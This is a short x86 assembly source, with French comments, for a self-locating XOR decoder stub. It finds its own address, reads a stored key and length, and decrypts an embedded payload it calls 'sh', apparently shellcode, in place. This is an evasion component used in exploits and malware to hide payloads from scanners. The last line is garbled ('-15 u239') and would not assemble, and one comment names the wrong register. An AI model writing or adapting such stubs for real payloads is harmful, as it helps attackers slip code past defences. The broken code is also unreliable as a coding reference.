.386
.model flat, stdcall
option casemap:none

.code
start:
un_crypt:
	call	un_delta
un_delta:
	pop	ebx
	mov	eax, ebx
	sub	eax, un_delta - un_crypt
	sub	eax, 2				; eax == &key
	mov	ecx, eax
	sub	ecx, 4				; ecx == strlen(sh)
	mov	edx, un_end - un_delta
	add	edx, ebx			; edx == &sh
	mov	ecx, [ecx]
un_crypting:
	mov	bl, [edx]			; edi pointe sur le carac courant
	push	eax
	mov	eax, [eax]
	xor	bl, al				; on le xor avec la cle
	pop	eax
	mov	[edx], bl			; on ecrase le carac courant

	inc	edx
	dec	ecx
	cmp 	ecx, 0
	jne	un_crypting -15 u239
un_end:
end start